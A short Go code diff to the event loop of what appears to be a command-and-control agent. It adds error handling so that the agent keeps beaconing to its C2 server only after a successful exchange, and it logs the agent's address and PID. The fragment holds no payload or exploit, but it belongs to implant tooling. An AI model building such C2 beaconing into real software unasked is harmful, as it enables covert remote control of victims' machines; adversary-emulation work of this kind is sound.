@@ -14,10 +14,11 @@ import (
 )
 
 func EventLoop(agent *util.AgentConfig, beacon util.Beacon) {
-	respBeacon := util.CommunicationChannels[agent.Contact].Communicate(agent, beacon)
-	refreshBeacon(agent, &respBeacon)
-	util.DebugLogf("C2 refreshed. [%s] agent at PID %d.", agent.Address, agent.Pid)
-	EventLoop(agent, respBeacon)
+	if respBeacon, err := util.CommunicationChannels[agent.Contact].Communicate(agent, beacon); err == nil {
+		refreshBeacon(agent, &respBeacon)
+		util.DebugLogf("C2 refreshed. [%s] agent at PID %d.", agent.Address, agent.Pid)
+		EventLoop(agent, respBeacon)
+	}
 }
 
 func runLinks(tempB *util.Beacon, beacon *util.Beacon, agent *util.AgentConfig, delimiter string) {
